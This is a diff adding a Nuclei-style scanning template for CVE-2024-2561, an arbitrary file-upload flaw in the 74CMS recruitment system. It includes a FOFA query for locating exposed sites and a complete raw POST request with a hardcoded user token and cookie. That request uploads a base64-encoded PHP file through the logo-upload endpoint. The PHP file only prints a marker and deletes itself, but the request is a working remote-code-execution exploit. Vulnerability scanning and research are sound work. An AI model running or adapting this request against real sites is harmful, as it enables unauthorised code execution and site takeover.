@@ -1,0 +1,37 @@
+id: 74cms-sendcompanylogo-upload
+
+info:
+  name: "74CMS sendCompanyLogo 组件文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="骑士-74CMS"
+        74CMS在/controller/company/Index.php#sendCompanyLogo组件（Company Logo Handler）中存在文件上传漏洞（CVE-2024-2561）。攻击者通过构造恶意imgBase64参数，可实现任意文件上传并执行远程代码。
+  reference:
+  - CVE-2024-2561
+  tags: 74CMS
+
+http:
+- raw:
+  - |
+    POST /v1_0/company/index/sendCompanyLogo HTTP/1.1
+    Host: {{Hostname}}
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    user-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MDk4MTY4MDcsImV4cCI6MTc0MTAyODgwNywiaW5mbyI6eyJ1aWQiOjEsInV0eXBlIjoxLCJtb2JpbGUiOiIxNTIxMjM0NTY3OCJ9fQ.8MYJ6e8qOGCR6s3pTIlFLsWFgAhC4f-F8XH_VNaC5BQ
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+    Cookie: qscms_visitor=%7B%22utype%22%3A1%2C%22mobile%22%3A%2215212345678%22%2C%22token%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MDk4MTY4MDcsImV4cCI6MTc0MTAyODgwNywiaW5mbyI6eyJ1aWQiOjEsInV0eXBlIjoxLCJtb2JpbGUiOiIxNTIxMjM0NTY3OCJ9fQ.8MYJ6e8qOGCR6s3pTIlFLsWFgAhC4f-F8XH_VNaC5BQ%22%7D
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+
+    imgBase64=data:image/php;base64,PD9waHAgZWNobyAnRHVkZVN1aXRlJzsgdW5saW5rKF9fRklMRV9fKTs=
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '生成成功'
